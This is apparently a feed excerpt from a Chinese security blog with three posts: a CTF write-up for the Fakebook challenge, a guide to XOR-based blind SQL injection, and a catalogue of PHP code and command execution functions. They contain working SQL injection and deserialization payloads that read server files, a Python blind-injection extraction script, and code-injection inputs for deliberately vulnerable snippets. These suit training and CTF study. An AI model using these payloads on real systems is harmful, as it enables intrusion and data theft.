别问怎么知道第几列的,反正我自己测的</p><p><strong>user.php</strong>   原来序列化的类</p><p>payload : </p><p>2 union&#x2F;**&#x2F;select 1,(select to_base64(load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;user.php’))),2,3%23</p><p>控制生成我们想要的序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//////// 这里是我添加的</span></span><br><span class="line"><span class="variable">$obj</span> = @<span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;age = <span class="number">18</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;blog = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;  <span class="comment"># 让他在序列化的时候读取flag 文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);  <span class="comment"># 输出序列化字符串</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230730215640833.png" alt="image-20230730215640833" style="zoom:50%;" />  <p>最终构造 payload </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=2 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230730215944056.png" alt="image-20230730215944056"> </p><p>在源码发现被进行 base64 编码的字符串, 最后解码得到 flag</p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230730220057631.png" alt="image-20230730220057631"> </p><p><img src="D:\zhuomian\github\图库\freebuf文章封面.png" alt="image-20230730225143856"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;网鼎杯-2018-Fakebook&quot;&gt;&lt;a href=&quot;#网鼎杯-2018-Fakebook&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2018]Fakebook&quot;&gt;&lt;/a&gt;[网鼎杯 2018]Fakebook&lt;/h2&gt;&lt;h3 id=&quot;直接放-答案&quot;&gt;&lt;a href=&quot;#直接放-答案&quot; class=&quot;headerlink&quot; title=&quot;直接放 答案&quot;&gt;&lt;/a&gt;直接放 答案&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;pre&gt;&lt;code&gt;no=2 union/**/select 1,(select to_base64(load_file(&amp;#39;/var/www/html/flag.php&amp;#39;))),2,3%23
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. ```&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   2 union/**/select 1,2,3,&amp;#x27;O:8:&amp;quot;UserInfo&amp;quot;:3:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:18;s:4:&amp;quot;blog&amp;quot;;s:29:&amp;quot;file:///var/www/html/flag.php&amp;quot;;&amp;#125;&amp;#x27;%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="靶场训练" scheme="https://blog.sunian.link/categories/%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="buuctf 反序列化 fakebook" scheme="https://blog.sunian.link/tags/buuctf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-fakebook/"/>
    
  </entry>
  
  <entry>
    <title>sql注入防御绕过-异或注入</title>
    <link href="https://blog.sunian.link/2023/07/30/sql%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87-%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/"/>
    <id>https://blog.sunian.link/2023/07/30/sql%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87-%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/</id>
    <published>2023-07-30T06:27:48.000Z</published>
    <updated>2023-07-30T06:39:10.721Z</updated>
    
    <content type="html"><![CDATA[<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>异或操作是一种位运算，当两个位不同时结果为1，否则为0。在MySQL中，我们可以利用异或操作来替换SQL语句中的布尔表达式，从而实现注入。</p><span id="more"></span><p>1 ^ 1 &#x3D; 0        ^ (异或符号)</p><p>1 ^ 0 &#x3D; 1 </p><h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>使用场景 :  or and || &amp; 被黑名单</p><h3 id="MYSQL-异或"><a href="#MYSQL-异或" class="headerlink" title="MYSQL 异或"></a>MYSQL 异或</h3><p>可以使用  </p><p>1^1^1 替换  1 and 1 &#x3D; 1     最终都为 1  (true)</p><p>1^0^1  替换  1 and 1 &#x3D; 2   最终都为   0 (false)</p><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>if( 条件,1,0)  利用 MYSQL 的 if()函数 这样即可返回 1 或者 0 , 最终可以通过异或来进行布尔注入</p><p>这样即可以和使用普通的布尔注入一样使用</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子:"></a>例子:</h3><p>如网站 : <a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a>    id&#x3D;1 时页面返回 hello , id &#x3D; 2 或其他东西时 返回 error </p><p>它有一张字段为name 的 flag 表 .  拿到他的数据  select name from flag  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/test.php?id=&#x27;</span></span><br><span class="line">sql = <span class="string">&#x27;select name from flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Length</span>(<span class="params">sql</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">f&#x27;1^(select if(select length(<span class="subst">&#123;sql&#125;</span>)=<span class="subst">&#123;i&#125;</span>,1,0))^1&#x27;</span></span><br><span class="line">        req = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hello&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"><span class="comment">#获取每个字符        </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getChr</span>(<span class="params">sql,num</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,num+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">126</span>):</span><br><span class="line">            payload = <span class="string">f&#x27;1^(select if(ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,1,0))^1&#x27;</span></span><br><span class="line">            req = requests.get(url=url+payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;hello&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">    <span class="keyword">return</span> flag </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">len</span> = Length(sql)</span><br><span class="line">    flag = getChr(sql,<span class="built_in">len</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">run()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;异或&quot;&gt;&lt;a href=&quot;#异或&quot; class=&quot;headerlink&quot; title=&quot;异或&quot;&gt;&lt;/a&gt;异或&lt;/h3&gt;&lt;p&gt;异或操作是一种位运算，当两个位不同时结果为1，否则为0。在MySQL中，我们可以利用异或操作来替换SQL语句中的布尔表达式，从而实现注入。&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://blog.sunian.link/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="sql注入" scheme="https://blog.sunian.link/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>远程代码及命令执行函数</title>
    <link href="https://blog.sunian.link/2023/07/29/rce/"/>
    <id>https://blog.sunian.link/2023/07/29/rce/</id>
    <published>2023-07-29T09:55:58.000Z</published>
    <updated>2023-07-30T06:38:12.133Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$ret = strtolower(&#x27;<span class="subst">$data</span>&#x27;);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br></pre></td></tr></table></figure><span id="more"></span><p>绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;);phpinfo();//</span><br><span class="line">123&#x27;);phpinfo();(&#x27;*/</span><br><span class="line">$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;sser&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$f</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可变函数在 7.1 之后都不能用</span></span><br></pre></td></tr></table></figure><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;</span>, <span class="string">&#x27;$ret=&quot;\\1&quot;;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 1.  有 /e</span></span><br><span class="line"><span class="comment">// 2.  第三个必须包含,第一个参数的字符</span></span><br><span class="line"><span class="comment">// 3.  php 5.6 </span></span><br><span class="line"><span class="comment">// 4.  $a 可控</span></span><br></pre></td></tr></table></figure><p>绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&lt;data&gt;$&#123;phpinfo()&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line"><span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="variable">$sort_function</span>);</span><br><span class="line"><span class="variable">$func</span>(<span class="number">1</span>,<span class="variable">$sort_by</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;]);&#125;phpinfo();/* </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$lambda</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&quot;return (strlen(\$a)-strlen(\$b)+&quot;</span> . <span class="string">&quot;strlen(<span class="subst">$c</span>));&quot;</span>);</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;reall long string here,boy&#x27;</span>, <span class="string">&#x27;this&#x27;</span>, <span class="string">&#x27;midding lenth&#x27;</span>, <span class="string">&#x27;larget&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$array</span>, <span class="variable">$lambda</span>);</span><br></pre></td></tr></table></figure><p>绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">));&#125;phpinfo();/*</span><br><span class="line">1)%2bphpinfo());&#125;/*</span><br></pre></td></tr></table></figure><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>] = <span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>, <span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br></pre></td></tr></table></figure><h3 id="usort"><a href="#usort" class="headerlink" title="usort"></a>usort</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = [<span class="string">&#x27;haha&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxx</span>(<span class="params"><span class="variable">$num1</span>,<span class="variable">$num2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">assert</span>(<span class="variable">$num1</span>);</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$a</span>,<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line"><span class="comment">//  --------------------------------</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = [<span class="variable">$cmd</span>,<span class="variable">$cmd</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">usort</span>(<span class="variable">$a</span>,<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有回显 </span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有回显    </span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无回显,需要用 var_dump($arr) ,// 返回的是数组  </span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$arr</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无回显 直接用 echo 就可用打印显示所有信息 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无回显,需要打印 popen(handle,mode)</span></span><br><span class="line"><span class="variable">$a</span> =  <span class="title function_ invoke__">popen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$b</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="number">1024</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无回显</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$des</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// 标准输入，子进程从此管道中读取数据</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// 标准输出，子进程向此管道中写入数据</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;./error-output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="comment">// 标准错误，写入到一个文件</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;ipconfig&#x27;</span>,<span class="variable">$des</span>,<span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号  &#96;&#96;"></a>反引号  &#96;&#96;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无回显,需要 echo </span></span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$_GET</span>[cmd]`;</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec()        </span><br></pre></td></tr></table></figure>]]></content>
    
    
